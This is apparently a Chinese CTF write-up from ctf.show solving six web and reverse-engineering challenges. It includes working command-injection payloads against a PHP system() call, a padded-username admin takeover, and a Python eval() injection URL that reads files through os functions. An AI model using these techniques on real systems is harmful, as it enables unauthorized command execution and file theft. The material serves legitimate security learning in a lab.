## Web
#### 签到题
```php
<?php 
if(isset($_GET['url'])){
        system("curl https://".$_GET['url'].".ctf.show");
}else{
        show_source(__FILE__);
}
 ?>
```
调用了 system() 这个函数，并且参数可控
尝试 `?url=;ls;` 会显文件，有戏
[upl-image-preview url=https://wp.ctf.show/assets/files/2020-03-06/1583502837-673356-image.png]
```
?url=;cat flag;
```
[upl-image-preview url=https://wp.ctf.show/assets/files/2020-03-06/1583502897-348269-image.png]

签到成功！！！~~流泪~~

----
#### 假赛生
```php
<?php
session_start();
include('config.php');
if(empty($_SESSION['name'])){
    show_source("index.php");
}else{
    $name=$_SESSION['name'];
    $sql='select pass from user where name="'.$name.'"';
    echo $sql."<br />";
    system('4rfvbgt56yhn.sh');
    $query=mysqli_query($conn,$sql);
    $result=mysqli_fetch_assoc($query);
    if($name==='admin'){
        echo "admin!!!!!"."<br />";
        if(isset($_GET['c'])){
            preg_replace_callback("/\w\W*/",function(){die("not allowed!");},$_GET['c'],1);
            echo $flag;
        }else{
            echo "you not admin";
        }
    }
}
?>
```
用 admin 随便 login 几下，估计没戏
随便注册一个帐号，提示
[upl-image-preview url=https://wp.ctf.show/assets/files/2020-03-06/1583503169-167119-image.png]

想到曾经见过的一个操作 ~~（我也不知道叫啥）~~
没限制空格，注册一个 admin      （后面加点空格）
然后用这个帐号的密码就能登录 admin
[upl-image-preview url=https://wp.ctf.show/assets/files/2020-03-06/1583503760-795400-image.png]

还要传一个 c，有一个正则式匹配
我真地看不懂，但是阴差阳错空着 c 就提交了
然后 flag 就出来了
[upl-image-preview url=https://wp.ctf.show/assets/files/2020-03-06/1583503845-895931-image.png]

想想也对，没东西能匹配个啥

----
#### 数学及格了
在 main.js 里面找到点东西
[upl-image-preview url=https://wp.ctf.show/assets/files/2020-03-06/1583504065-463074-image.png]
然后乱交了点东西，报错了
[upl-image-preview url=https://wp.ctf.show/assets/files/2020-03-06/1583502627-644438-image.png]
可以看到是用的 python 的 eval() 计算的，就存在漏洞
然后就去找 eval() 的骚操作
然后，各种尝试
发现了 __import__('os') ，开始的时候用的 __import__('os').system('dir') 结果老是 0 
查了资料发现 system() 成功了会返回 0
好吧，换姿势，寻找 os 模块里的其他函数，然后找到了 listdir()
但是，他一直报错 QwQ
然而没有影响，报错的会显有我需要的东西
[upl-image-preview url=https://wp.ctf.show/assets/files/2020-03-06/1583505282-951759-image.png]
然后找到 flag，用 open() 和 read() 读取
```python
http://124.156.121.112:5000/_calculate?number1=1*int(str(__import__('os').read(__import__('os').open('/home/ctf/web/flag',__import__('os').O_RDONLY),30)))
```
[upl-image-preview url=https://wp.ctf.show/assets/files/2020-03-06/1583505430-375170-image.png]


----

#### 数学不及格
逻辑清楚，比较简单
[upl-image-preview url=https://wp.ctf.show/assets/files/2020-03-06/1583506179-23010-image.png]

先传入 4 个参数，第 4 个参数减去 25923 传入 f() 
[upl-image-preview url=https://wp.ctf.show/assets/files/2020-03-06/1583506466-758116-image.png]

f(a) 功能就是返回斐波拉契数列第 a-1 项
然后满足四个方程，解开就 ok 了
解出来 
```cpp
V4=58
V9=591286729879
v10=439904987003
v11=474148725349
v12=435392374130
```
然后把四个参数转成 16 进制拼在一起得到
```
666c61677b6e65776265655f686572657d
```
转成 str 就是 flag
```python
s='666c61677b6e65776265655f686572657d'
flag=''
for i in range(0,len(s),2):
	flag+=chr(int(s[i:i+2],16))
print flag
```
condor2048 大佬用的
```python
bytes.fromhex(s)
```
~~ps：本来是涉及取模运算，存在多解，所以群主改了，有取模的话可能还要好玩一点~~

----
#### flag白给
先用 Wine 运行一下查看特征
[upl-image-preview url=https://wp.ctf.show/assets/files/2020-03-06/1583511836-379408-image.png]
随便输入，弹出 错误
IDA 打开发现有 UPX 壳，命令行 upx -d 脱壳后 IDA 重新载入
shift+f12 查看字符表，没看到有用的东西
[upl-image-preview url=https://wp.ctf.show/assets/files/2020-03-07/1583563139-485343-qq20200307143715.png]
~~虽然这种题一般都不会找到有用的字符串~~
从导入表里找到 GetWindowsTextA
[upl-image-preview url=https://wp.ctf.show/assets/files/2020-03-06/1583511373-255116-image.png]
跟进，一路回溯到一个名叫 TForm1_Button1Click
[upl-image-preview url=https://wp.ctf.show/assets/files/2020-03-06/1583511529-743279-image.png]
至于为什么找他，因为他的名字就很有鬼
两个 str___[1] 一个是 成功 ，一个是 错误
[upl-image-preview url=https://wp.ctf.show/assets/files/2020-03-06/1583511715-501166-image.png]
然后看看这个函数逻辑，判断 v6 是不是等于 str_HackAv[1]
str_HackAv[1] 是 'HackAv'，盲猜 v6 就是输入
[upl-image-preview url=https://wp.ctf.show/assets/files/2020-03-07/1583564052-484300-image.png]
这个题可能动态调试要快很多，但是
[upl-image-preview url=https://wp.ctf.show/assets/files/2020-03-07/1583564308-186706-qq20200307145749.jpeg]

----
#### 签退
开始的时候用的在线的反编译，效果非常糟糕，原来的 uncompyle2 又迷之不能用
只好装了一个
```bash
pip install uncompyle 
uncompyle6 re3.pyc > re3.py
```
得到源码
```python
# uncompyle6 version 3.6.4
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.17 (default, Jan 19 2020, 19:54:54) 
# [GCC 9.2.1 20200110]
# Embedded file name: re3.py
# Compiled at: 2020-03-06 17:43:28
import string
c_charset = string.ascii_uppercase + string.ascii_lowercase + string.digits + '()'
flag = 'BozjB3vlZ3ThBn9bZ2jhOH93ZaH9'

def encode(origin_bytes):
    c_bytes = [ ('{:0>8}').format(str(bin(b)).replace('0b', '')) for b in origin_bytes ]
    resp = ''
    nums = len(c_bytes) // 3
    remain = len(c_bytes) % 3
    integral_part = c_bytes[0:3 * nums]
    while integral_part:
        tmp_unit = ('').join(integral_part[0:3])
        tmp_unit = [ int(tmp_unit[x:x + 6], 2) for x in [0, 6, 12, 18] ]
        resp += ('').join([ c_charset[i] for i in tmp_unit ])
        integral_part = integral_part[3:]

    if remain:
        remain_part = ('').join(c_bytes[3 * nums:]) + (3 - remain) * '0' * 8
        tmp_unit = [ int(remain_part[x:x + 6], 2) for x in [0, 6, 12, 18] ][:remain + 1]
        resp += ('').join([ c_charset[i] for i in tmp_unit ]) + (3 - remain) * '.'
    return rend(resp)


def rend(s):

    def encodeCh(ch):
        f = lambda x: chr((ord(ch) - x + 2) % 26 + x)
        if ch.islower():
            return f(97)
        if ch.isupper():
            return f(65)
        return ch

    return ('').join(encodeCh(c) for c in s)
# okay decompiling re3.pyc
```
有个 flag 字符串，多半就是加密后的 flag
流程就是 flag 经过 encode() 加密后再传给 rend() 经过 encodeCh() 加密

这个 encode() 看着挺复杂的，但结合 `//3` `%3` 等等特征可以猜测他是 base64 加密
为验证我的猜想，输出字符集 c_charset 查看
```python
c_charset = string.ascii_uppercase + string.ascii_lowercase + string.digits + '()'
print c_charset
#ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789()
```
其实就是把 base64 字符集的最后两位 `+/` 换成 `()`，而且没有用到
之后就简单的写个脚本爆破一下，再 base64 解码就搞定了
```python
#python2.7
import string
import base64
c_charset = string.ascii_uppercase + string.ascii_lowercase + string.digits + '()'
flag = 'BozjB3vlZ3ThBn9bZ2jhOH93ZaH9'
print c_charset
print len(c_charset)

def encodeCh(ch):
    f = lambda x: chr((ord(ch) - x + 2) % 26 + x)
    if ch.islower():
        return f(97)
    if ch.isupper():
        return f(65)
    return ch
   
trueflag=''
for i in flag:
	for j in c_charset:
		if(encodeCh(j)==i):
			trueflag+=j
			break
print trueflag
print base64.b64decode(trueflag)
```
[upl-image-preview url=https://wp.ctf.show/assets/files/2020-03-07/1583576754-151066-image.png]
 ~~ps：无法理解为啥 python3 不向下兼容，有时候难受死了~~
[https://www.cnblogs.com/tcctw/p/11333743.html](https://www.cnblogs.com/tcctw/p/11333743.html)
<!--stackedit_data:
eyJoaXN0b3J5IjpbMTkzMzE0NDM0OF19
-->